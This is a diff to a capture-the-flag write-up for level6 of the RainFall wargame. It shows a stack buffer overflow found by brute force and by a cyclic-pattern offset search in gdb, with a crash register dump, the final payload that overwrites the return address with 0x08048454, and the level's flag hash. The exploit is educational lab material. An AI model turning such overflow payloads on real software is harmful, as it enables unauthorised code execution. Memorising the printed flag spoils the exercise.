@@ -104,3 +104,42 @@ Exploit and log on to the next level.
 level6@RainFall:~$ for i in {0..100}; do ./level6 $(python -c "print '\x54\x84\x04\x08'*$i") | grep -v Nope && break; done
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
+Or find offset using [BOF EIP Offset String Generator](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)
+```gdb
+level6@RainFall:~$ gdb --args ./level6  Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+Reading symbols from /home/user/level6/level6...(no debugging symbols found)...done.
+gdb-peda$ run
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x41346341 ('Ac4A')
+EBX: 0xb7fd0ff4 --> 0x1a4d7c
+ECX: 0xbffff8c0 ("c9Ad0Ad1Ad2A")
+EDX: 0x804a060 ("c9Ad0Ad1Ad2A")
+ESI: 0x0
+EDI: 0x0
+EBP: 0xbffff678 --> 0x0
+ESP: 0xbffff64c --> 0x80484d2 (<main+86>:	leave)
+EIP: 0x41346341 ('Ac4A')
+EFLAGS: 0x210202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41346341
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff64c --> 0x80484d2 (<main+86>:	leave)
+0004| 0xbffff650 --> 0x804a008 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
+0008| 0xbffff654 --> 0xbffff868 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
+0012| 0xbffff658 --> 0xb7fd0ff4 --> 0x1a4d7c
+0016| 0xbffff65c --> 0xb7e5ee55 (<__cxa_atexit+53>:	add    esp,0x18)
+0020| 0xbffff660 --> 0xb7fed280 (push   ebp)
+0024| 0xbffff664 --> 0x0
+0028| 0xbffff668 --> 0x804a050 ("Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41346341 in ?? ()
+```
+Using generated string of 100 bytes shows that offset is 72.
+```sh
+level6@RainFall:~$ ./level6 $(python -c "print 'A'*72 +'\x54\x84\x04\x08'" )
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
